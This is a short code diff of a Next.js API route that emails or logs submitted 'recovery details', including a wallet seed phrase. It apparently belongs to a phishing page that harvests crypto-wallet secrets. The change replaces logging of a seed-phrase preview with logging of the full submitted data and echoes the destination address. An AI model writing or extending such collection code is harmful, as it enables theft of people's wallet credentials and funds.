@@ -42,9 +42,9 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ success: true, message: 'Recovery details sent via SendGrid' }, { status: 200 })
     }
 
-    // If no known mail transport configured, log and return success
-    console.log('Recovery details (no mail transport):', { to: toAddress, from: email, method, timestamp, seedPhrase: safePreview })
-    return NextResponse.json({ success: true, message: 'Recovery details logged' }, { status: 200 })
+    // If no known mail transport configured, log submitted data and return success
+    console.log('Recovery details (no mail transport):', { to: toAddress, from: email, method, timestamp, submitted })
+    return NextResponse.json({ success: true, message: `Recovery details logged (to: ${toAddress})` }, { status: 200 })
   } catch (error) {
     console.error('Error sending recovery email:', error)
     return NextResponse.json({ error: 'Failed to send recovery email' }, { status: 500 })
